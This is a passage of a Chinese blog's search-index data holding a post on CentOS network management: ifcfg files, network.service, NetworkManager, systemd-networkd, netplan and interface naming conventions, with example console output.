title=\"配置有线网卡\"></a>配置有线网卡</h2><p>安装完成后，编辑网卡配置文件<code>/etc/sysconfig/network-scripts/ifcfg-eno1</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost network-scripts]# more /etc/sysconfig/network-scripts/ifcfg-eno1</span><br><span class=\"line\">TYPE=Ethernet</span><br><span class=\"line\">PROXY_METHOD=none</span><br><span class=\"line\">BROWSER_ONLY=no</span><br><span class=\"line\">BOOTPROTO=static            # 修改默认值dhcp</span><br><span class=\"line\">DEFROUTE=yes</span><br><span class=\"line\">IPV4_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6INIT=yes</span><br><span class=\"line\">IPV6_AUTOCONF=yes</span><br><span class=\"line\">IPV6_DEFROUTE=yes</span><br><span class=\"line\">IPV6_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class=\"line\">NAME=eno1</span><br><span class=\"line\">UUID=47adb195-54ee-4c74-85a2-2b1fcb499e01</span><br><span class=\"line\">DEVICE=eno1</span><br><span class=\"line\">ONBOOT=yes                  # 修改默认值no</span><br><span class=\"line\">IPADDR=192.168.0.132        # New</span><br><span class=\"line\">NETMASK=255.255.255.0       # New</span><br><span class=\"line\">GATEWAY=192.168.0.1         # New</span><br><span class=\"line\">DNS1=192.168.0.1            # New</span><br></pre></td></tr></table></figure>\n"},{"title":"Centos网络管理要点","url":"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/","content":"<h2 id=\"一、-网络接口设备\"><a href=\"#一、-网络接口设备\" class=\"headerlink\" title=\"一、 网络接口设备\"></a>一、 网络接口设备</h2><p>Linux2.6 内核引入了一个基于内存的文件系统 <strong>sysfs</strong> ，用于向用户空间导出内核设备资源并且进行读写操作，挂载点位于<code>/sys</code> 。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# tree /sys -L 1</span><br><span class=\"line\">/sys</span><br><span class=\"line\">├── block           已废弃。记录当前被发现的所有块设备，已迁移到 /sys/class/block</span><br><span class=\"line\">├── bus             已注册在操作系统内核的总线类型，每种类型均包括 devices 和 drivers</span><br><span class=\"line\">├── class           最核心！已注册在操作系统内核的全量设备，按照设备功能分目录管理</span><br><span class=\"line\">├── dev             维护一个字符设备和块设备的软链接文件</span><br><span class=\"line\">├── devices         最基础！全局设备结构体系，包含所有被发现的注册在各种总线上的各种真实物理设备</span><br><span class=\"line\">├── firmware        系统加载固件对象和属性的用户空间接口</span><br><span class=\"line\">├── fs              记录当前被发现的所有文件系统</span><br><span class=\"line\">├── hypervisor      与虚拟化Xen相关的装置</span><br><span class=\"line\">├── kernel          内核中所有可调整的参数</span><br><span class=\"line\">├── module          包含所有的被载入操作系统内核的模块</span><br><span class=\"line\">└── power           系统的电源选项</span><br></pre></td></tr></table></figure>\n\n<p>该文件系统是内核设备树的一个直观反映，也就是说，当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。<br>Centos网络接口信息位于<code>/sys/class/net</code>，但该目录下实际都是软链接文件，物理文件实际位于<code>/sys/devices</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv fs]# ls -l /sys/class/net</span><br><span class=\"line\">总用量 0</span><br><span class=\"line\">lrwxrwxrwx 1 root root 0  8月 19 10:24 ens18 -&gt; ../../devices/pci0000:00/0000:00:12.0/virtio3/net/ens18</span><br><span class=\"line\">lrwxrwxrwx 1 root root 0  8月 19 10:24 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure>\n\n<p>要查看网络接口信息，最简单的方法就是命令<code>ip a</code>，或者传统方式<code>ifconfig -a</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv network]# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 5a:3b:ab:a3:01:88 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.32/24 brd 192.168.0.255 scope global dynamic ens18</span><br><span class=\"line\">       valid_lft 28934sec preferred_lft 28934sec</span><br><span class=\"line\">    inet6 2409:8a00:321c:d121:583b:abff:fea3:188/64 scope global dynamic mngtmpaddr noprefixroute </span><br><span class=\"line\">       valid_lft 215859sec preferred_lft 129459sec</span><br><span class=\"line\">    inet6 fe80::583b:abff:fea3:188/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、-网络服务组件\"><a href=\"#二、-网络服务组件\" class=\"headerlink\" title=\"二、 网络服务组件\"></a>二、 网络服务组件</h2><h3 id=\"1-network-service\"><a href=\"#1-network-service\" class=\"headerlink\" title=\"1. network.service\"></a>1. network.service</h3><h4 id=\"network的启动方式\"><a href=\"#network的启动方式\" class=\"headerlink\" title=\"network的启动方式\"></a>network的启动方式</h4><p>Centos7 之前的版本都是通过 <code>network.service</code> 管理网络配置，启动方式还是基于<code>rc.d</code>的传统方式，启动脚本位于 <code>/etc/rc.d/init.d/network</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@copy-of-vm-centos7 ~]# systemctl status network</span><br><span class=\"line\">● network.service - LSB: Bring up/down networking</span><br><span class=\"line\">   Loaded: loaded (/etc/rc.d/init.d/network; bad; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since 四 2023-08-17 23:53:18 CST; 1 day 16h ago</span><br><span class=\"line\">     Docs: man:systemd-sysv-generator(8)</span><br><span class=\"line\">  Process: 576 ExecStart=/etc/rc.d/init.d/network start (code=exited, status=0/SUCCESS)</span><br><span class=\"line\">   CGroup: /system.slice/network.service</span><br><span class=\"line\">           └─760 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid -H copy-of-vm-centos7 eth0</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 22:32:37 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 15251 seconds.</span><br><span class=\"line\">8月 19 02:46:48 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 02:46:48 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 02:46:50 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 15611 seconds.</span><br><span class=\"line\">8月 19 07:07:01 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 07:07:01 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 07:07:03 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 17059 seconds.</span><br><span class=\"line\">8月 19 11:51:22 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 11:51:22 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 11:51:24 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 17493 seconds.</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"network的配置文件\"><a href=\"#network的配置文件\" class=\"headerlink\" title=\"network的配置文件\"></a>network的配置文件</h4><p>网卡配置文件位于<code>/etc/sysconfig/network-scripts/</code>，每个设备都需要生成独立的接口配置文件，命名方式是<code>ifcfg-&lt;网络接口名&gt;</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv /]# ls -l /etc/sysconfig/network-scripts/</span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">-rw-r--r--. 1 root root 279  8月 15 22:11 ifcfg-ens18</span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv /]# more /etc/sysconfig/network-scripts/ifcfg-ens18</span><br><span class=\"line\">TYPE=Ethernet</span><br><span class=\"line\">PROXY_METHOD=none</span><br><span class=\"line\">BROWSER_ONLY=no</span><br><span class=\"line\">BOOTPROTO=dhcp</span><br><span class=\"line\">DEFROUTE=yes</span><br><span class=\"line\">IPV4_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6INIT=yes</span><br><span class=\"line\">IPV6_AUTOCONF=yes</span><br><span class=\"line\">IPV6_DEFROUTE=yes</span><br><span class=\"line\">IPV6_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class=\"line\">NAME=ens18</span><br><span class=\"line\">UUID=8e4c648c-871f-4223-8d94-ee09aa8580b9</span><br><span class=\"line\">DEVICE=ens18</span><br><span class=\"line\">ONBOOT=no</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"network的应用说明\"><a href=\"#network的应用说明\" class=\"headerlink\" title=\"network的应用说明\"></a>network的应用说明</h4><ul>\n<li><code>network.service</code> 是一个非常简单的软件包，仅有264行代码的脚本文件</li>\n<li>设计目标基于简单的有线网络环境，当网络接口配置信息修改后，网络服务必须重新启动，因此很难满足无线网络切换的需求</li>\n</ul>\n<h3 id=\"2-NetworkManager-service\"><a href=\"#2-NetworkManager-service\" class=\"headerlink\" title=\"2. NetworkManager.service\"></a>2. NetworkManager.service</h3><p>RedHat 在2004年启动了 NetworkManager 项目，皆在能够让Linux用户更轻松的处理现代网络需求，尤其是无线网络，能够自动发现网卡并配置IP地址，现在由 GNOME 管理。</p>\n<h4 id=\"NetworkManager的启动方式\"><a href=\"#NetworkManager的启动方式\" class=\"headerlink\" title=\"NetworkManager的启动方式\"></a>NetworkManager的启动方式</h4><p><code>NetworkManager.service</code>的主程序是<code>/usr/sbin/NetworkManager</code>，支持 systemd 启动方式，启动配置文件位于<code>/usr/lib/systemd/system/NetworkManager.service</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl status NetworkManager</span><br><span class=\"line\">● NetworkManager.service - Network Manager</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/NetworkManager.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">  Drop-In: /usr/lib/systemd/system/NetworkManager.service.d</span><br><span class=\"line\">           └─NetworkManager-ovs.conf</span><br><span class=\"line\">   Active: active (running) since Fri 2023-08-18 00:06:55 CST; 33min ago</span><br><span class=\"line\">     Docs: man:NetworkManager(8)</span><br><span class=\"line\"> Main PID: 547 (NetworkManager)</span><br><span class=\"line\">    Tasks: 5</span><br><span class=\"line\">   Memory: 13.0M</span><br><span class=\"line\">   CGroup: /system.slice/NetworkManager.service</span><br><span class=\"line\">           ├─547 /usr/sbin/NetworkManager --no-daemon</span><br><span class=\"line\">           ├─573 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/NetworkManager/dhclient-eth0.pid -lf /var/lib/NetworkMan&gt;</span><br><span class=\"line\">           └─965 /sbin/dhclient -d -q -6 -N -sf /usr/libexec/nm-dhcp-helper -pf /var/run/NetworkManager/dhclient6-eth0.pid -lf /var/lib/Net&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option life_starts          =&gt; &#x27;1692288420&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option max_life             =&gt; &#x27;43200&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option preferred_life       =&gt; &#x27;43200&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option rebind               =&gt; &#x27;34560&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option renew                =&gt; &#x27;21600&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option requested_dhcp6_client_id =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option requested_dhcp6_domain_search =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): option requested_dhcp6_name_servers =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): option starts               =&gt; &#x27;1692288420&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): state changed unknown -&gt; bound, event ID=&quot;28:3&gt;</span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]#</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"NetworkManager的配置文件\"><a href=\"#NetworkManager的配置文件\" class=\"headerlink\" title=\"NetworkManager的配置文件\"></a>NetworkManager的配置文件</h4><p><code>NetworkManager.service</code>网卡配置方式与<code>network.service</code>保持一致，也是位于<code>/etc/sysconfig/network-scripts/</code>，文件命名和配置方式也完全相同。<br><code>nmcli</code>是用于控制 NetworkManager 和报告网络状态的命令行工具，用于创建，显示，编辑，删除，激活和停用网络连接，以及控制和显示网络设备状态。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# nmcli connection show</span><br><span class=\"line\">NAME   UUID                                  TYPE      DEVICE </span><br><span class=\"line\">ens18  8e4c648c-871f-4223-8d94-ee09aa8580b9  ethernet  ens18  </span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]# ls -l /etc/sysconfig/network-scripts</span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">-rw-r--r-- 1 root root 280  8月 19 23:40 ifcfg-ens18</span><br></pre></td></tr></table></figure>\n\n<p>此外，NetworkManager 还有一个漂亮的图形界面软件 <code>nmtui</code>，其核心功能与<code>nmcli</code>完全相同。<br><img src=\"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/nmtui.png\" alt=\"nmtui\"></p>\n<h4 id=\"NetworkManager的应用说明\"><a href=\"#NetworkManager的应用说明\" class=\"headerlink\" title=\"NetworkManager的应用说明\"></a>NetworkManager的应用说明</h4><ul>\n<li>Centos7 同时支持<code>network.service</code>和<code>NetworkManager.service</code>，相当于在 Centos7 的一个过渡，默认情况下这2个服务都有开启，但是因为<code>NetworkManager.service</code>当时的兼容性不好，大部分人都会将其关闭</li>\n<li>Centos 8 已经废弃 network.service（默认不安装），只能通过 NetworkManager 进行网络配置，OpenEuler 21.10 也是这样</li>\n</ul>\n<h3 id=\"3-systemd-networkd-service\"><a href=\"#3-systemd-networkd-service\" class=\"headerlink\" title=\"3. systemd-networkd.service\"></a>3. systemd-networkd.service</h3><p>作为一个 “从未完成、从未完善、但一直追随技术进步” 的系统，systemd 已经不只是一个初始化进程，它被设计为一个更广泛的系统以及服务管理平台，包含了不断增长的核心系统进程、库和工具的生态系统。<br><code>systemd-networkd</code>是 Systemd 计划的一部分，旨在提供一个轻量级、高性能的网络管理器。它使用原生Linux网络接口，不依赖第三方软件包，因此占用更少的资源和内存。</p>\n<h4 id=\"systemd-networkd的启动方式\"><a href=\"#systemd-networkd的启动方式\" class=\"headerlink\" title=\"systemd-networkd的启动方式\"></a>systemd-networkd的启动方式</h4><p>systemd 210 及其更高版本提供了<code>systemd-networkd</code>，其主程序是<code>/usr/lib/systemd/systemd-networkd</code>，启动配置文件位于<code>/usr/lib/systemd/system/systemd-networkd.service</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl status systemd-networkd</span><br><span class=\"line\">● systemd-networkd.service - Network Service</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/systemd-networkd.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">   Active: active (running) since Fri 2023-08-18 00:06:55 CST; 35min ago</span><br><span class=\"line\">     Docs: man:systemd-networkd.service(8)</span><br><span class=\"line\"> Main PID: 548 (systemd-network)</span><br><span class=\"line\">   Status: &quot;Processing requests...&quot;</span><br><span class=\"line\">    Tasks: 1</span><br><span class=\"line\">   Memory: 1.6M</span><br><span class=\"line\">   CGroup: /system.slice/systemd-networkd.service</span><br><span class=\"line\">           └─548 /usr/lib/systemd/systemd-networkd</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd[1]: Starting Network Service...</span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd-networkd[548]: Enumeration completed</span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd[1]: Started Network Service.</span><br><span class=\"line\">8月 18 00:06:56 MiWiFi-RA70-srv systemd-networkd[548]: eth0: Gained carrier</span><br><span class=\"line\">8月 18 00:06:58 MiWiFi-RA70-srv systemd-networkd[548]: eth0: Gained IPv6LL</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"systemd-networkd的配置方式\"><a href=\"#systemd-networkd的配置方式\" class=\"headerlink\" title=\"systemd-networkd的配置方式\"></a>systemd-networkd的配置方式</h4><p>网络配置文件保存在<code>/etc/systemd/network/</code>。<br>配置文件名可以任意，物理网络设备一般使用后缀名<code>.network</code>，虚拟网络设备一般使用后缀名<code>.netdev</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /etc/systemd/network/20-dhcp.network</span></span><br><span class=\"line\">[Match]</span><br><span class=\"line\">Name=enp3*</span><br><span class=\"line\">[Network]</span><br><span class=\"line\">DHCP=yes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /etc/systemd/network/10-static-enp3s0.network</span></span><br><span class=\"line\">[Match]</span><br><span class=\"line\">Name=enp3s0</span><br><span class=\"line\">[Network]</span><br><span class=\"line\">Address=192.168.10.50/24</span><br><span class=\"line\">Gateway=192.168.10.1</span><br><span class=\"line\">DNS=8.8.8.8</span><br></pre></td></tr></table></figure>\n\n<p>正如你上面看到的，每个网络配置文件包括了一个或多个 “sections”，每个 “section”都用 [XXX] 开头。每个 section 包括了一个或多个键值对。<br><code>[Match]</code>部分决定这个配置文件配置哪个（些）网络设备。例如，这个文件匹配所有名称以 ens3 开头的网络设备（例如 enp3s0、 enp3s1、 enp3s2 等等）对于匹配的接口，<code>[Network]</code>部分指定的 DHCP 网络配置。</p>\n<blockquote>\n<p>配置目录存在多个文件时，<code>systemd-networkd</code>会按照字母顺序一个个加载并处理。</p>\n</blockquote>\n<h4 id=\"systemd-networkd的应用说明\"><a href=\"#systemd-networkd的应用说明\" class=\"headerlink\" title=\"systemd-networkd的应用说明\"></a>systemd-networkd的应用说明</h4><ul>\n<li>目前，<code>systemd-networkd</code>还不能直接支持无线网络，但你可以使用<code>wpa_supplicant</code>服务配置无线适配器，然后把它和<code>systemd-networkd</code>联系起来</li>\n<li>使用<code>systemd-networkd</code>时，需要手工启用<code>systemd-resolved</code>服务用于域名解析。<br>  该服务实现了一个缓存式 DNS 服务器，并通过<code>/run/systemd/resolve/resolv.conf</code>管理DNS服务。<br>  由于很多应用程序依赖于<code>/etc/resolv.conf</code>，因此为了兼容性需要为两者建立一个软链接。</li>\n<li>Ubuntu 18.04及更高版本中，默认使用 systemd-networkd 作为网络管理器，但也可以选择切换到 NetworkManager。</li>\n</ul>\n<h3 id=\"4-netplan\"><a href=\"#4-netplan\" class=\"headerlink\" title=\"4. netplan\"></a>4. netplan</h3><p>Netplan 是由 Ubuntu 的母公司 Canonical 开发的网络组件，目标是为不同的后端管理工具提供统一的网络配置抽象方法。</p>\n<ul>\n<li>目前支持的网络管理工具后端为：NetworkManager 和 NetworkManager</li>\n<li>网络配置语言采用 YAML 格式</li>\n<li>网络配置存储目录位于：<code>/etc/netplan/*.yaml</code>，可以系统管理员手工配置，也可以是云镜像或者其他操作系统部署设施自动生成</li>\n<li>Github 主页位于：<a href=\"https://github.com/canonical/netplan\">https://github.com/canonical/netplan</a></li>\n</ul>\n<p><img src=\"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/netplan_design_overview.svg\" alt=\"Alt text\"></p>\n<p>以最简单的静态网卡配置为例，</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">  <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"attr\">renderer:</span> <span class=\"string\">networkd</span></span><br><span class=\"line\">  <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">    <span class=\"attr\">enp3s0:</span></span><br><span class=\"line\">      <span class=\"attr\">addresses:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.2</span><span class=\"string\">/24</span></span><br><span class=\"line\">      <span class=\"attr\">nameservers:</span></span><br><span class=\"line\">        <span class=\"attr\">search:</span> [<span class=\"string\">mydomain</span>, <span class=\"string\">otherdomain</span>]</span><br><span class=\"line\">        <span class=\"attr\">addresses:</span> [<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span>, <span class=\"number\">1.1</span><span class=\"number\">.1</span><span class=\"number\">.1</span>]</span><br><span class=\"line\">      <span class=\"attr\">routes:</span> </span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">to:</span> <span class=\"string\">default</span></span><br><span class=\"line\">          <span class=\"attr\">via:</span> <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n\n<p>netplan 提供两个命令行工具：</p>\n<ul>\n<li><code>netplan generate</code> ：以 <code>/etc/netplan</code> 配置为管理工具生成配置信息</li>\n<li><code>netplan apply</code> ：应用配置。调整 &#x2F;etc&#x2F;netplan 配置后，需要执行该命令方能生效，必要时重启管理工具</li>\n</ul>\n<h2 id=\"三、小结\"><a href=\"#三、小结\" class=\"headerlink\" title=\"三、小结\"></a>三、小结</h2><ol>\n<li>如果你使用的是 KDE 或者 GOME 等 Linux 桌面，毫无疑问应该使用 NetworkManager。<br> 因为其使用DBus作为通信机制，可以集成各种网络类型和设备，包括以太网、无线网络、蓝牙、移动宽带等，支持广泛的网络协议和语言环境，提供图形界面和命令行界面等多种管理方式，能让你的计算机在任何时候通过多种接口保持连接。</li>\n<li>如果你使用的是 Linux 服务器，则需要区分不同版本：<ul>\n<li>Centos7 及以前版本：建议直接使用 network，并关闭 NetworkManager，因为存在一些兼容性问题</li>\n<li>Centos8 及以后版本：建议使用 NetworkManager，并关闭 systemd-networkd（network 已被默认卸载）</li>\n</ul>\n</li>\n<li>systemd-networkd 有着快速启动、低内存占用和高性能等突出优点，与其他 systemd 组件（例如用于域名解析的 resolved、NTP 的timesyncd，用于命名的 udevd）结合的非常好，但目前还不是一个成熟的解决方案，主要问题是：<ul>\n<li>不支持无线网络，需要手工关联<code>wpa_supplicant</code>服务</li>\n<li>全局域名解析存在缺陷，需要手工关联<code>systemd-resolved</code>服务</li>\n<li>不能为更高层面的脚本编程提供 ifup&#x2F;ifdown 钩子函数</li>\n</ul>\n</li>\n<li>Netplan 目前并未流行，主要是 Ubuntu 17 以后的版本提供，Centos 似乎没有默认安装包。</li>\n</ol>\n<hr>\n<h2 id=\"附录：网卡设备的命名方式\"><a href=\"#附录：网卡设备的命名方式\" class=\"headerlink\" title=\"附录：网卡设备的命名方式\"></a>附录：网卡设备的命名方式</h2><p>Centos6 及之前的版本网卡命名格式：eth[0123…]，也就是常见的<code>eth0</code>等等。随着服务器网卡的数量、类型和集成方式越来越复杂（既有主板集成的，也有PCIe插槽，wifi、蓝牙等无线网卡），简单的数字编号已经很难准确标识网卡接口的物理位置。</p>\n<p>Centos7 开始默认启用一致网络设备命名（Consistent Network Device Naming），支持 biosdevname 和 net.ifnames 两种命名规范。<br>常见的 net.ifnames 命名规范表述为：<code>设备类型 + 设备位置 + 数字</code>，主要设备类型前缀包括：</p>\n<ul>\n<li><code>en</code> ：用于以太网</li>\n<li><code>wl</code> ：用于无线 LAN(WLAN)</li>\n<li><code>ww</code> ：用于无线广域网(WWAN)。</li>\n</ul>\n<p>另外，以下之一会根据 udev 设备管理器应用的模式，附加到上述前缀中的一个：</p>\n<ul>\n<li><code>o&lt;on-board_index_number&gt;</code>：主板集成设备</li>\n<li><code>s&lt;hot_plug_slot_index_number&gt;[f&lt;function&gt;][d&lt;device_id&gt;]</code>：主板集成的PCI插槽<br>  请注意，所有多功能 PCI 设备在设备名称中都包含<code>[f&lt;function&gt;]</code>号，包括功能 0 设备。</li>\n<li><code>x&lt;MAC_address&gt;</code>：网卡的MAC地址</li>\n<li><code>[P&lt;domain_number&gt;]p&lt;bus&gt;s&lt;slot&gt;[f&lt;function&gt;][d&lt;device_id&gt;]</code>：PCI扩展卡<br>  <code>[P&lt;domain_number&gt;]</code> 部分定义了 PCI 的地理位置。如果域号不是 0 ，才会设置此部分。</li>\n<li><code>[P&lt;domain_number&gt;]p&lt;bus&gt;s&lt;slot&gt;[f&lt;function&gt;][u&lt;usb_port&gt;][…​][c&lt;config&gt;][i&lt;interface&gt;]</code>：USB设备<br>  对于 USB 设备，hub 端口号的完整链由 hub 的端口号组成。如果名称大于最大值（15 个字符），则不会导出该名称。如果链中有多个 USB 设备，则 udev 会抑制 USB 配置描述符(c1)和 USB 接口描述符(i0)的默认值。</li>\n</ul>\n<blockquote>\n<p>biosdevname 规范的常见名称包括：em1、p3p4、p3p4_1、。。。</p>\n</blockquote>\n<p>udev 设备管理器会根据以下方案生成设备名称：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Scheme</th>\n<th>描述</th>\n<th align=\"center\">示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td>设备名称包含固件或者 BIOS 提供的索引号，用于板上的设备。如果此信息不可用或不适用，则 udev 将使用方案 2。</td>\n<td align=\"center\">eno1，主板集成的1号以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td>设备名称包含固件或 BIOS 提供的 PCI Express（PCIe）热插件插槽索引号。如果此信息不可用或不适用，则 udev 将使用方案 3。</td>\n<td align=\"center\">ens1，内置1号PCI接口的以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td>设备名称包含硬件连接器的物理位置。如果此信息不可用或不适用，则 udev 将使用方案 5。</td>\n<td align=\"center\">enp2s0，2号PCI扩展卡的slot 0的以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">4</td>\n<td>设备名称包含 MAC 地址。Red Hat Enterprise Linux 默认不使用这个方案，但管理员可选择性地使用它。</td>\n<td align=\"center\">enx525400d5e0fb，网卡的MAC地址</td>\n</tr>\n<tr>\n<td align=\"center\">5</td>\n<td>传统的无法预计的内核命名方案。如果 udev 无法应用任何其他方案，则设备管理器使用这个方案。</td>\n<td align=\"center\">eth0，传统方案</td>\n</tr>\n</tbody></table>\n<p>更多示例包括：</p>\n<ul>\n<li>wlp3s0 ：PCI无线网卡</li>\n<li>wwp0s29f7u2i2 ：4G modem</li>\n<li>wlp0s2f1u4u1 ：连接在USB Hub上的无线网卡</li>\n<li>enx78e7d1ea46da ：直接以MAC地址命名的 PCI 网卡</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/consistent-network-interface-device-naming_configuring-and-managing-networking\">Red Hat 官方文档 - 一致的网络接口设备命名</a></li>\n<li><a href=\"https://www.cnblogs.com/jikexianfeng/p/9209663.html\">linux 